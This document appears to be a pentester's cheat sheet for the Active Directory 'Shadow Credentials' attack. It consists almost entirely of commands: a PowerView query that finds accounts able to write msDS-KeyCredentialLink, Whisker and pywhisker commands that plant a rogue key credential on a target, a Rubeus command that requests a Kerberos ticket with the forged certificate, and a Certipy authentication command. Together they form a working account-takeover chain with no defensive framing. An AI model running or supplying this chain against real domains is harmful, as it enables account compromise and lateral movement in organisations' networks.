# Shadow Credentials
```
msDS-KeyCredentialLink GUID: 068f1ad2-2434-4530-9b04-1b327b587d15

Windows Hello for Business (WHfB)
```

# Search msDS-KeyCredentialLink attribute
```powershell 
Get-DomainObjectAcl | Where-Object {
    ($_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll") -and 
    ($_.ObjectType -eq "068f1ad2-2434-4530-9b04-1b327b587d15") # msDS-KeyCredentialLink-in GUID-i
} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},
                  @{Name="TargetObject"; Expression={Convert-SidToName $_.ObjectDN}},
                  ActiveDirectoryRights -Unique
```

# Whisker
```powershell
.\Whisker.exe add /target:TargetObject /domain:lab.local /dc:dc01.lab.local
.\Whisker.exe list /target:TargetObject

.\Whisker.exe remove /target:TargetObject /deviceid:<DeviceID_from_add_command>

python3 pywhisker.py -d "lab.local" -u "attacker_user" -p "password" --target "target_user" --action "add"
```

# Rubeus
```powershell
.\Rubeus.exe asktgt /user:TargetObject /certificate:MII...base64... /password:"WhiskerPassword" /gettgtpkinit
```

# Certipy
```powershell
certipy auth -pfx target.pfx -dc-ip <DC_IP> -username target_user -domain lab.local
```
